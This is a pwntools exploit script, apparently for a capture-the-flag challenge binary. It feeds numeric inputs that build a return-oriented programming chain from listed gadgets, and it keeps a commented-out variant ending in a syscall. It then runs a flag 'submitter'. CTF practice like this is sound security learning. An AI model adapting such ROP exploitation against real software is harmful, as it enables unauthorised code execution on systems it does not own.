from pwn import *

var = os.getenv("DEBUGINFOD_URLS")

binary_name = "challenge"
exe  = ELF(binary_name, checksec=True)
context.binary = exe

ru	= lambda *x: r.recvuntil(*x)
rl	= lambda *x: r.recvline(*x)
rc	= lambda *x: r.recv(*x)
sla = lambda *x: r.sendlineafter(*x)
sa	= lambda *x: r.sendafter(*x)
sl	= lambda *x: r.sendline(*x)
sn	= lambda *x: r.send(*x)

if var is None:
	HOST = os.environ.get("HOST", "localhost")
	PORT = 31337
	r = connect(HOST, int(PORT))
elif args.GDB:
	r = gdb.debug(f"./{binary_name}", """
		b *0x401A55
		c
	""", aslr=False)
else:
	r = process(f"./{binary_name}")

for i in range(3):
	sla(b": ", b"123")

sla(b": ", b"400000000")

# 0x00487342: pop rax; pop rdx; leave; ret;
# 0x0000000000402218 : pop rdi ; pop rbp ; ret
# 0x0000000000402216 : pop rsi ; pop r15 ; pop rbp ; ret
# 0x0000000000426893 : inc rdi ; add rax, rdi ; vzeroupper ; ret

sla(b": ", b"402218")
sla(b": ", b"38")
sla(b": ", b"123")
sla(b": ", b"426893")

sla(b": ", b"402218")
sla(b": ", b"1")
sla(b": ", b"123")
sla(b": ", b"426893")

sla(b": ", b"402218")
sla(b": ", b"499950")
sla(b": ", b"123")

sla(b": ", b"436488")

for i in range(424):
	sla(b": ", b"469631")

for i in range(1):
	sla(b": ", b"426893")

sla(b": ", b"436488")

sla(b": ", b"402216")
sla(b": ", b"81")
sla(b": ", b"123")
sla(b": ", b"123")
sla(b": ", b"468086")

# sla(b": ", b"487342") # pop rdx
# sla(b": ", b"1")
# sla(b": ", b"7")
#
# sla(b": ", b"1")
# sla(b": ", b"2")
# sla(b": ", b"3")
# sla(b": ", b"4")
# sla(b": ", b"5")
# sla(b": ", b"6")
# sla(b": ", b"7")
# sla(b": ", b"8")
# sla(b": ", b"9")
# sla(b": ", b"10")
# sla(b": ", b"11")
# sla(b": ", b"12")
# sla(b": ", b"13")
# sla(b": ", b"14")
# sla(b": ", b"15")
# sla(b": ", b"16")
# sla(b": ", b"17")
#
# sla(b": ", b"402216") # pop rsi
# sla(b": ", b"1000")
# sla(b": ", b"123")
# sla(b": ", b"123")
#
# sla(b": ", b"402218") # pop rdi
# sla(b": ", b"8")
# sla(b": ", b"123")
#
# sla(b": ", b"426893") # set rax
#
# sla(b": ", b"402218") # pop rdi
# sla(b": ", b"401000")
# sla(b": ", b"123")
#
# sla(b": ", b"437559")  # syscall




sla(b": ", b"0")



if var is None:
	r.sendline(b'./submitter')
	print(r.recvall(timeout=1))
else:
	r.interactive()
